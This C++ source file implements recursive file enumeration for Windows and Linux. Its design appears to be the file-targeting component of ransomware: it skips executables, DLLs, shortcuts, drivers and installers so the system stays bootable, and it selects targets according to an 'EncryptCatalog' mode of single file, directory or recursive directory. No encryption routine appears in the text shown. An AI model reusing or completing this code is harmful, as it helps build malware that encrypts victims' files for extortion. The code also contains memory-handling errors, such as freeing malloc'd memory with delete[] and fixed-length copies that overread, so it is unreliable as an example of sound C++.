#ifdef _WIN32
#include <Windows.h>
#else
#include <cstring>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#endif

#include <stdio.h>
#include <memory>
#include <string>

#include "pathsystem.h"
#include "filesystem.h"
#include "global_parameters.h"
#include "memory.h"
#include "logs.h"

typedef struct directory_info
{
    TCHAR* Directory;
    LIST_ENTRY(directory_info);
}DIRECTORY_INFO, * PDIRECTORY_INFO;


STATIC BOOL CheckFilename(TCHAR* cFilename)
{
    CONST TCHAR* BlackList[]
    {
        T(".exe"),
        T(".dll"),
        T(".lnk"),
        T(".sys"),
        T(".msi")
    };

    size_t len = memory::StrLen(cFilename);
    if (len == 0) return TRUE;
    int i = static_cast<int>(len) - 1;
    for (; i >= 0; --i)
    {
        if (cFilename[i] == T('.'))
            break;
    }

    if (i < 0)
        return TRUE;

    for (int k = 0; k < 5; ++k)
    {
        if (memory::StrStr(&cFilename[i], BlackList[k]))
            return FALSE;
    }

    return TRUE;
}


STATIC TCHAR* MakeExst(TCHAR* Filename)
{
    size_t len = memory::StrLen(Filename);
    int j = 0;
    int i = static_cast<int>(len) - 1;
    for (; i >= 0; --i, ++j)
    {
        if (Filename[i] == T('.'))
        {
            ++j;
            break;
        }
    }

    if (i < 0)
    {
        TCHAR* empty = (TCHAR*)memory::m_malloc(Tsize);
        return empty;
    }

    TCHAR* exst = (TCHAR*)memory::m_malloc((j + 1) * sizeof(TCHAR));
    memc(exst, &Filename[i], j);
    return exst;
}

STATIC TCHAR* MakePath
(
    TCHAR* Filename,
    TCHAR* Directory
)
{
    size_t dir_len = memory::StrLen(Directory);
    size_t file_len = memory::StrLen(Filename);
    TCHAR* str = (TCHAR*)memory::m_malloc((dir_len + file_len + 2) * Tsize);

    memc(str, Directory, dir_len);
    memc(&str[dir_len], slash, 1);
    memc(&str[dir_len + 1], Filename, file_len);
    return str;
}

#ifdef _WIN32
STATIC WCHAR* MakeSearchMask
(
    WCHAR* Directory,
    size_t DirLen
)
{
    std::wstring Path = Directory[DirLen - 1] == '/' ?
        std::wstring(Directory) + std::wstring(L"*") :
        std::wstring(Directory) + std::wstring(L"/*");
    size_t PathLen = Path.size() + 1;
    WCHAR* mask = (WCHAR*)malloc(PathLen * sizeof(WCHAR));
    if (!mask)
    {
        WCHAR* empty = (WCHAR*)memory::m_malloc(sizeof(WCHAR));
        return empty;
    }
    wmemcpy_s(mask, PathLen, Path.c_str(), PathLen);
    return mask;
}
#endif

STATIC VOID SearchFiles
(
    TCHAR* StartDirectory,
    LIST<DIRECTORY_INFO>* DirectoryInfo,
    LIST<pathsystem::DRIVE_INFO>* DriveInfo
)
{
    size_t DirLen = memory::StrLen(StartDirectory);

#ifdef _WIN32
    WIN32_FIND_DATAW FindData;
    WCHAR* DirectoryMask = MakeSearchMask(StartDirectory, DirLen);

    HANDLE hSearchFile = FindFirstFileW(DirectoryMask, &FindData);
    if (hSearchFile == INVALID_HANDLE_VALUE)
    {
        printf_s("FindFirstFile fails in directory %ls. GetLastError = %lu.", StartDirectory, GetLastError());
        delete[] DirectoryMask;
        return;
    }

    do
    {
        if (!lstrcmpW(FindData.cFileName, L".") ||
            !lstrcmpW(FindData.cFileName, L"..") ||
            FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
        {
            continue;
        }
        if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            PDIRECTORY_INFO DirectoryData = new DIRECTORY_INFO;
            DirectoryData->Directory = MakePath(FindData.cFileName, StartDirectory);
            DirectoryInfo->LIST_INSERT_HEAD(DirectoryData);
            ++pathsystem::f.dir;
        }
        else if (CheckFilename(FindData.cFileName))
        {
            WCHAR* cFilename = (WCHAR*)memory::m_malloc(260 * sizeof(WCHAR));
            wmemcpy_s(cFilename, 260, FindData.cFileName, 260);
            pathsystem::PDRIVE_INFO DriveData = new pathsystem::DRIVE_INFO;
            {
                DriveData->Filename = cFilename;
                DriveData->Exst = MakeExst(cFilename);
                DriveData->FullPath = MakePath(cFilename, StartDirectory);
                WCHAR* Dir = (WCHAR*)memory::m_malloc((DirLen + 1) * sizeof(WCHAR));
                wmemcpy_s(Dir, DirLen + 1, StartDirectory, DirLen + 1);
                DriveData->Path = Dir;
            }
            DriveInfo->LIST_INSERT_HEAD(DriveData);
            ++pathsystem::f.fle;
        }

    } while (FindNextFileW(hSearchFile, &FindData));
    FindClose(hSearchFile);
    delete[] DirectoryMask;
#else
    struct dirent* entry;
    DIR* dp = opendir(StartDirectory);
    if (dp == NULL)
    {
        LOG_ERROR("[SearchFiles] [opendir] Failed; %s", StartDirectory);
        return;
    }

    while ((entry = readdir(dp)) != NULL)
    {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        CHAR full_path[4096];
        snprintf(full_path, sizeof(full_path), "%s/%s", StartDirectory, entry->d_name);

        struct stat statbuf;
        if (stat(full_path, &statbuf) == -1)
        {
            perror("stat");
            continue;
        }

        if (S_ISDIR(statbuf.st_mode))
        {
            PDIRECTORY_INFO DirectoryData = new DIRECTORY_INFO;
            DirectoryData->Directory = MakePath(entry->d_name, StartDirectory);
            DirectoryInfo->LIST_INSERT_HEAD(DirectoryData);
            ++pathsystem::f.dir;
        }
        else if (S_ISREG(statbuf.st_mode) && CheckFilename(entry->d_name))
        {
            CHAR* cFilename = (CHAR*)memory::m_malloc(260);
            memcpy(cFilename, entry->d_name, 260);
            pathsystem::PDRIVE_INFO DriveData = new pathsystem::DRIVE_INFO;
            {
                DriveData->Filename = cFilename;
                DriveData->Exst = MakeExst(cFilename);
                DriveData->FullPath = MakePath(cFilename, StartDirectory);
                CHAR* Dir = (CHAR*)memory::m_malloc((DirLen + 1));
                memcpy(Dir, StartDirectory, DirLen + 1);
                DriveData->Path = Dir;
            }
            DriveInfo->LIST_INSERT_HEAD(DriveData);
            ++pathsystem::f.fle;
        }



    }

    closedir(dp);
#endif
}


size_t pathsystem::StartLocalSearch(LIST<DRIVE_INFO>* DriveInfo, TCHAR* dir)
{
    if (GLOBAL_ENUM.g_EncryptCat == EncryptCatalog::FILE_CAT)
    {
        TCHAR* name = NULL;
        TCHAR* path = NULL;

        for (int i = memory::StrLen(dir) - 1, j = 0; i >= 0; --i, ++j)
        {
            if (dir[i] == T('/') || dir[i] == T('\\'))
            {
                name = (TCHAR*)memory::m_malloc((j + 1) * Tsize);
                memc(name, &dir[i + 1], j);

                path = (TCHAR*)memory::m_malloc((i + 1) * Tsize);
                memc(path, dir, i);

                break;
            }
        }

        pathsystem::PDRIVE_INFO DriveData = new pathsystem::DRIVE_INFO;
        if (name)
            DriveData->Filename = name;
        if (path)
            DriveData->Path = path;
        DriveData->FullPath = dir;
        DriveData->Exst = MakeExst(dir);
        DriveInfo->LIST_INSERT_HEAD(DriveData);

        return 1;
    }
    LIST<DIRECTORY_INFO>* DirectoryInfo = new LIST<DIRECTORY_INFO>;
    SearchFiles(dir, DirectoryInfo, DriveInfo);


    if (GLOBAL_ENUM.g_EncryptCat == EncryptCatalog::DIR_CAT)
    {

    }
    else if (GLOBAL_ENUM.g_EncryptCat  == EncryptCatalog::INDIR_CAT)
    {
        PDIRECTORY_INFO dirs = NULL;
        REV_LIST_FOREACH(dirs, DirectoryInfo)
        {
            SearchFiles(dirs->Directory, DirectoryInfo, DriveInfo);
        }
    }

    PDIRECTORY_INFO dir_ = NULL;
    LIST_FOREACH(dir_, DirectoryInfo)
    {
        LOG_INFO("DIRECTORIES: " log_str, dir_->Directory);
        memory::m_free(dir_->Directory);
    }
    delete DirectoryInfo;

    return f.fle;
}


VOID pathsystem::FreeList(LIST<DRIVE_INFO>* DriveInfo)
{
    if (DriveInfo == NULL) return;
    PDRIVE_INFO data = NULL;
    LIST_FOREACH(data, DriveInfo)
    {
        memory::m_free(data->Exst);
        memory::m_free(data->Filename);
        memory::m_free(data->FullPath);
        memory::m_free(data->Path);
    }

    delete DriveInfo;
}